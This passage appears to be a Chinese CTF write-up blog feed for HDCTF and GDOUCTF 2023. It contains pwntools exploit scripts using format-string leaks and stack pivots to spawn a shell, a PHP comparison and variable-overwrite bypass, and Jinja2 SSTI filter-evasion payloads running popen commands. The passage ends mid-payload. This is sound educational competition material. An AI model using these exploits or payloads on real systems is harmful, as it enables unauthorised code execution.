class="language-none">HDCTF&#123;Y0u_h@v2_&#x2F;\&#x2F;\@57er3d_7he_r3v3rs3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Keep-on"><a href="#Keep-on" class="headerlink" title="Keep_on:"></a>Keep_on:</h2><p>简单的栈栈迁移问题,直接套我深藏已久的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>native <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> native<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'pwn1'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node2.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28720</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn1'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> <span class="token number">0x400911</span>leave_ret <span class="token operator">=</span> <span class="token number">0x4007f2</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008d3</span>ret <span class="token operator">=</span> <span class="token number">0x4005b9</span>sla<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">b'%16$p'</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"hello,"</span><span class="token punctuation">)</span>rbp_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x10</span>success<span class="token punctuation">(</span><span class="token string">"rbp-->"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rbp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>s_input <span class="token operator">=</span> rbp_addr <span class="token operator">-</span> <span class="token number">0x50</span>payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span>s_input<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>s_input<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>sea<span class="token punctuation">(</span><span class="token string">"keep on !\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="minions"><a href="#minions" class="headerlink" title="minions:"></a>minions:</h2><p>也是一道栈迁移，跟刚刚keep_on差不多，只是多了一点计算，话不多说还直接拿出我珍藏的大脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>native <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> native<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'pwn1'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node6.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28576</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn1'</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token number">0x6010a0</span>payload <span class="token operator">=</span> <span class="token string">b'%28$p'</span><span class="token operator">+</span> <span class="token string">b'%88c%8$hhna'</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>key<span class="token punctuation">)</span>sea<span class="token punctuation">(</span><span class="token string">"name?\n\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>hdf <span class="token operator">=</span> <span class="token number">0x6010c0</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400893</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>ru<span class="token punctuation">(</span><span class="token string">"Hello,"</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x40</span>success<span class="token punctuation">(</span><span class="token string">"stack-->"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>s_input <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x30</span>ret <span class="token operator">=</span> <span class="token number">0x400581</span>leave_ret <span class="token operator">=</span> <span class="token number">0x400758</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">,</span>ret<span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span>s_input<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>s_input<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>sea<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sea<span class="token punctuation">(</span><span class="token string">"Minions"</span><span class="token punctuation">,</span><span class="token string">b'pwn!'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h2><pre class="line-numbers language-none"><code class="language-none">$zsteg emoji.png[?] 40 bytes of extra data after image end (IEND), offset &#x3D; 0x8a697extradata:0         .. text: &quot;SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ&#x3D;&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>base64解码即可</p><pre class="line-numbers language-none"><code class="language-none">HDCTF&#123;wE1c0w3_10_HDctf_M15c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2023HDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 GDOUCTF</title>
      <link href="/2023/04/16/2023-GDOUCTF/"/>
      <url>/2023/04/16/2023-GDOUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>查看源码，点开JS代码</p><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416171204097.png" alt="image-20230416171204097"></p><p>找到这个语句，这应该就是弹出flag的语句</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x324fcb</span><span class="token punctuation">(</span><span class="token number">0x2d9</span><span class="token punctuation">,</span><span class="token number">0x2c3</span><span class="token punctuation">,</span><span class="token number">0x2db</span><span class="token punctuation">,</span><span class="token number">0x2f3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'k3r_h0pe_t'</span><span class="token operator">+</span><span class="token function">_0xe4a674</span><span class="token punctuation">(</span><span class="token number">0x5a1</span><span class="token punctuation">,</span><span class="token number">0x595</span><span class="token punctuation">,</span><span class="token number">0x59e</span><span class="token punctuation">,</span><span class="token number">0x57c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'irlfriend&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现里面包含两个函数，但是源码太长看不懂干脆就直接把这一堆都放控制台</p><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416171858555.png" alt="image-20230416171858555"></p><p>然后执行</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x324fcb</span><span class="token punctuation">(</span><span class="token number">0x2d9</span><span class="token punctuation">,</span><span class="token number">0x2c3</span><span class="token punctuation">,</span><span class="token number">0x2db</span><span class="token punctuation">,</span><span class="token number">0x2f3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'k3r_h0pe_t'</span><span class="token operator">+</span><span class="token function">_0xe4a674</span><span class="token punctuation">(</span><span class="token number">0x5a1</span><span class="token punctuation">,</span><span class="token number">0x595</span><span class="token punctuation">,</span><span class="token number">0x59e</span><span class="token punctuation">,</span><span class="token number">0x57c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'irlfriend&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就得到flag了</p><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416171836729.png" alt="image-20230416171836729"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;J_0k3r_h0pe_to_have_@_girlfriend&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>首先扫描目录，找到了   &#x2F;src</p><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416172225142.png" alt="image-20230416172225142"></p><p>访问得到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flaskapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要在&#x2F;super-secret-route-nobody-will-guess 这个路径下  使用PUT方法就可以得到flag</p><p>BURP抓包</p><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416172603991.png" alt="image-20230416172603991"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;f2db3bbb-abbc-40c5-be8e-01c1f32ab51b&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"> &lt;?phperror_reporting(0);header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);if(isset($_POST[&#39;gdou&#39;])&amp;&amp;isset($_POST[&#39;ctf&#39;]))&#123;    $b&#x3D;$_POST[&#39;ctf&#39;];    $a&#x3D;$_POST[&#39;gdou&#39;];    if($_POST[&#39;gdou&#39;]!&#x3D;$_POST[&#39;ctf&#39;] &amp;&amp; md5($a)&#x3D;&#x3D;&#x3D;md5($b))&#123;        if(isset($_COOKIE[&#39;cookie&#39;]))&#123;           if ($_COOKIE[&#39;cookie&#39;]&#x3D;&#x3D;&#39;j0k3r&#39;)&#123;               if(isset($_GET[&#39;aaa&#39;]) &amp;&amp; isset($_GET[&#39;bbb&#39;]))&#123;                  $aaa&#x3D;$_GET[&#39;aaa&#39;];                  $bbb&#x3D;$_GET[&#39;bbb&#39;];                 if($aaa&#x3D;&#x3D;114514 &amp;&amp; $bbb&#x3D;&#x3D;114514 &amp;&amp; $aaa!&#x3D;$bbb)&#123;                   $give &#x3D; &#39;cancanwordflag&#39;;                   $get &#x3D;&#39;hacker!&#39;;                   if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;                         die($give);                    &#125;                   if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39; || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;                       die($get);                    &#125;                    foreach ($_POST as $key &#x3D;&gt; $value) &#123;                        $$key &#x3D; $value;                   &#125;                    foreach ($_GET as $key &#x3D;&gt; $value) &#123;                         $$key &#x3D; $$value;                    &#125;                   echo $f1ag;            &#125;else&#123;                  echo &quot;洗洗睡吧&quot;;                 &#125;    &#125;else&#123;        echo &quot;行不行啊细狗&quot;;        &#125;  &#125;&#125;else &#123;  echo &#39;菜菜&#39;;&#125;&#125;else&#123;  echo &quot;就这?&quot;;&#125;&#125;else&#123;  echo &quot;别来沾边&quot;;&#125;?&gt;别来沾边<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">首先是数组绕过，post参数  gdou和ctf   然后cookie传参  cookie&#x3D;j0k3raaa&#x3D;114514&amp;bbb&#x3D;114514a最后就是变量覆盖问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416211448230.png" alt="image-20230416211448230"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;72d7f2f6-3937-4655-9273-8e3a2cbeac57&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id><a href="#" class="headerlink" title></a><ez_ze></ez_ze></h2><p>首先试了一些东西没试出来，那就抓个包看看，</p><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416211943666.png" alt="image-20230416211943666"></p><p>可以联想到SSTI  </p><pre class="line-numbers language-none"><code class="language-none">传入&#123;&#123;&#125;&#125;发现被过滤了，然后又试一下其他的发现过滤了下面这几个&#123;&#123;&#125;&#125;._class[]&quot;\x5f（_）os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就很难搞了</p><pre class="line-numbers language-none"><code class="language-none">然后是通过&#123;%%&#125;来绕过&#123;&#123;&#125;&#125;，但是&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。而&#123;&#123;&#125;&#125;用于将表达式打印到模板输出。所以要想输出的话需要使用print函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#123;%print 7*7%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/16/2023-GDOUCTF/image-20230416212359474.png" alt="image-20230416212359474"></p><p>刚开始就一直按照的常规思路构造payload,但是发现过滤的东西太多了，非常难搞</p><p>然后就通过搜索发现了几篇文章SSTI十分详细</p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p><p><a href="https://www.freesion.com/article/57831125204/#_56">https://www.freesion.com/article/57831125204/#_56</a></p><p>然后看了文章之后刚开始尝试了</p><pre class="line-numbers language-none"><code class="language-none">1.用编码转换但是这种编码转换只针对python2,但是本题是python3&quot;__class__&quot;&#x3D;&#x3D;(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)2.然后采用了ASCII码值绕过&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)&#x3D;&#39;__class__&#39;但是按照这种思路&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()&#125;&#125; 无论我怎么构造就是不正确，不知道怎么搞3.然后发现我以前做过的笔记有一种这样的方法&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125;&#125;因为这种方法的payload相对于常规的payload的长度较短，通过构造的方式比较简单啦就想着试一下，然后还是通过这种方式&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)&#x3D;&#39;__class__&#39;构造出的payload为&#123;%print 